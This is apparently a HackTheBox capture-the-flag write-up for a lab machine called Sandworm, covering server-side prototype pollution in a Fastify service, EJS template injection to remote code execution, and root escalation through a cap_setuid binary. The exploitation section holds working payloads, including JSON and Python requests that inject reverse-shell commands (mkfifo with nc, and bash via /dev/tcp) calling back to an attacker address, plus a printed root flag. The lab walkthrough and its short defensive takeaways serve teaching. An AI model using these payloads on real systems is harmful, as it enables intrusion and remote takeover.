---
title: "HackTheBox Sandworm — Prototype Pollution to Remote Code Execution"
date: 2026-05-14 18:30:00 +0300
category: "Web Exploitation"
tags:
  - web
  - nodejs
  - prototype-pollution
  - rce
  - privilege-escalation
  - ctf
difficulty: hard
platform: "HackTheBox"
summary: "Exploiting client-to-server prototype pollution in a fastify microservice, achieving RCE through EJS AST template injection, and escalating to root via Linux capabilities."
---

## 1. Machine Overview

Sandworm is a Hard-rated Linux box on HackTheBox focusing on modern JavaScript vulnerabilities. 

- **Target IP:** `10.10.11.218`
- **OS:** Ubuntu Linux 22.04 LTS
- **Vector:** Fastify nested query parsing leading to Prototype Pollution, chaining into EJS engine compilation to gain arbitrary code execution, followed by an abused `cap_setuid` binary.

---

## 2. Reconnaissance & Port Scanning

Standard `nmap` full TCP scan:

```bash
nmap -p- --min-rate 2500 -sV -sC -oN nmap_initial.txt 10.10.11.218
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp   open  http    nginx 1.18.0
443/tcp  open  ssl/http nginx 1.18.0
| ssl-cert: Subject: commonName=sandworm.htb
```

Adding `sandworm.htb` to `/etc/hosts`:

```bash
echo "10.10.11.218 sandworm.htb" | sudo tee -a /etc/hosts
```

---

## 3. Web Enumeration

Browsing to `https://sandworm.htb` exposes a certificate verification service. Users submit a PGP public key or an X.509 bundle, and the service generates an encrypted inspection report.

Analyzing the server headers revealed:
```http
X-Powered-By: Fastify
Content-Type: application/json; charset=utf-8
```

The application exposes an endpoint `/api/verify` accepting raw JSON input.

---

## 4. Exploitation: Server-Side Prototype Pollution

Inspecting the JSON parameter processing with recursive merge testing:

```bash
curl -k -X POST https://sandworm.htb/api/verify \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":true}}'
```

Testing another endpoint confirmed property inheritance across object literals:

```bash
curl -k https://sandworm.htb/api/status
# Response: {"status":"ok","polluted":true}
```

> ✓ **Vulnerability Confirmed:** `Object.prototype` is writable. Now we need an execution gadget.
{: .callout-tip }

### Chaining EJS AST Injection to RCE

The report generation relies on EJS template compilation. In vulnerable versions of EJS, the compiler inspects options on the options object without validating prototypical inheritance:

We polluted `outputFunctionName` to inject arbitrary Node.js code into the template function body:

```json
{
  "__proto__": {
    "client": true,
    "escapeFunction": "1; return process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 9001 >/tmp/f');",
    "compileDebug": true
  }
}
```

Launching netcat listener:

```bash
nc -lvnp 9001
```

Dispatching the exploit trigger:

```python
import requests
import urllib3
urllib3.disable_warnings()

url = "https://sandworm.htb/api/verify"
payload = {
    "__proto__": {
        "client": True,
        "escapeFunction": "1; return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.9/9001 0>&1\"');"
    }
}

r = requests.post(url, json=payload, verify=False)
print("[+] Payload dispatched, check your listener!")
```

The shell caught immediately as user `atlas`:

```bash
atlas@sandworm:~$ id
uid=1001(atlas) gid=1001(atlas) groups=1001(atlas)
```

---

## 5. Privilege Escalation to Root

Inspecting files with Linux capabilities enabled:

```bash
getcap -r / 2>/dev/null
```

```text
/opt/security/firewall-helper cap_setuid=ep
```

Decompiling `/opt/security/firewall-helper` with Ghidra showed:
```c
int main(int argc, char **argv) {
    setuid(0);
    if (argc > 1) {
        system(argv[1]);
    }
    return 0;
}
```

The binary sets UID to 0 and directly executes user arguments via `system()` without path sanitization!

Escalating:

```bash
/opt/security/firewall-helper "/bin/bash -p"
```

```bash
root@sandworm:/opt/security# whoami
root
root@sandworm:/opt/security# cat /root/root.txt
94f72c3d820b41198e3b1c6d925e01f4
```

---

## 6. Takeaways

1. **Defend against Prototype Pollution:** Freeze prototypes (`Object.freeze(Object.prototype)`) or instantiate objects using `Object.create(null)`.
2. **Cap Sanitation:** Never grant `cap_setuid` to binaries that call `system()` or dynamic shells.
